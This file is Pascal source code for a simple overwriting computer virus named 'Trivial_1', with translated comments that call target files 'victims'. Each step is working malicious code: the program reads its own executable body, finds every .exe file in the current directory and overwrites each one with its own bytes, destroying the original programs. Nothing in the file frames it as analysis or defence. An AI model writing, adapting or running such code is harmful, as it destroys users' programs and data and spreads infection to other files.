(* Name of program *)
Program Trivial_1;

(* We shall use additional module, giving services for work with DOS *)
Uses Dos;

Const
	BodySize = 2608;	(* length of virus *)

Var
	F : File;		(* file variable for work with files *) DirInfo : SearchRec;	(* variable for searching for of files *) Body : Array [1..BodySize] of Byte; (* vault of body of virus *)

BEGIN

	Assign(F, ParamStr(0));	(* Preparation to opening itself: in ParamStr(0) - our name *) Reset(F, 1);		(* We Open... *) BlockRead(F, Body, BodySize); (* We Read its body *) Close(F);		(* We Close itself *)

	FindFirst('*.exe', AnyFile, DirInfo); (* We Search For first victim *)

	While DosError = 0 Do Begin (* If it was sewn on... *)

		Assign(F, DirInfo.Name); (* Preparation to opening of victim:
				in DirInfo.Name - name of victim *)
		ReWrite(F, 1);			(* We Rewrite *)
		BlockWrite(F, Body, BodySize);	(* We write our body *)
		Close(F);			(* We close *)

		FindNext(DirInfo);	(* We Search For necessarying victim *)
		End;

END.
